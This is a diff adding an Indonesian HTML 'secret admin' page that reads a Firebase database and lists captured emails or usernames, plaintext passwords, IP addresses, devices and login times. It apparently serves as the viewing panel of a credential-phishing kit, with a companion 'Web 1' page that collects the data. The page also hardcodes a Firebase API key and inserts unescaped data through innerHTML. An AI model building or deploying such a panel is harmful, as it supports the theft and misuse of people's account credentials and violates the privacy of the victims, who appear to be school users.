@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Admin - Database Sekolah</title>
+
+<style>
+body{
+  background:#0a1a2f; 
+  color:white;
+  font-family: 'Segoe UI', Arial;
+  padding:20px;
+}
+h2 {
+  text-align: center;
+  color: cyan;
+  text-shadow: 0 0 10px cyan;
+}
+table{
+  width:100%;
+  border-collapse:collapse;
+  margin-top: 20px;
+  background: rgba(0,0,0,0.5);
+}
+td,th{
+  border:1px solid cyan;
+  padding:12px;
+  text-align: left;
+  font-size: 14px;
+}
+th {
+  background: cyan;
+  color: black;
+}
+tr:hover {
+  background: rgba(0,255,255,0.1);
+}
+/* Style khusus untuk kolom Device agar tidak terlalu lebar */
+.device-col {
+  max-width: 200px;
+  word-wrap: break-word;
+  font-size: 12px;
+  color: #ccc;
+}
+</style>
+</head>
+
+<body>
+<h2>HALAMAN RAHASIA ADMIN</h2>
+
+<table>
+<thead>
+<tr>
+<th>Email / Username</th>
+<th>Password</th>
+<th>IP Address</th>
+<th>Device / HP</th>
+<th>Waktu Login</th>
+</tr>
+</thead>
+<tbody id="data">
+  <tr>
+    <td colspan="5" style="text-align:center;">Menunggu data masuk...</td>
+  </tr>
+</tbody>
+</table>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+// KONFIGURASI FIREBASE (Sama dengan Web 1)
+const firebaseConfig = {
+  apiKey: "AIzaSyBktafl9kk7CFzxb80Q_A1XulGHVwTAFU",
+  authDomain: "sekolah-ku-c6e16.firebaseapp.com",
+  databaseURL: "https://sekolah-ku-c6e16-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "sekolah-ku-c6e16"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const tbody = document.getElementById("data");
+
+// Membaca folder "users"
+onValue(ref(db, "users"), snapshot => {
+  if (snapshot.exists()) {
+    tbody.innerHTML = "";
+    snapshot.forEach(child => {
+      const d = child.val();
+      const waktuIndo = d.time ? new Date(d.time).toLocaleString("id-ID") : "-";
+      
+      // Menambahkan baris baru ke tabel
+      tbody.innerHTML += `
+        <tr>
+          <td><b>${d.email}</b></td>
+          <td>${d.password}</td>
+          <td><span style="color: #00ff99;">${d.ip || "-"}</span></td>
+          <td class="device-col">${d.device || "-"}</td>
+          <td><small>${waktuIndo}</small></td>
+        </tr>
+      `;
+    });
+  } else {
+    tbody.innerHTML = "<tr><td colspan='5' style='text-align:center;'>Belum ada data.</td></tr>";
+  }
+});
+</script>
+</body>
+</html>
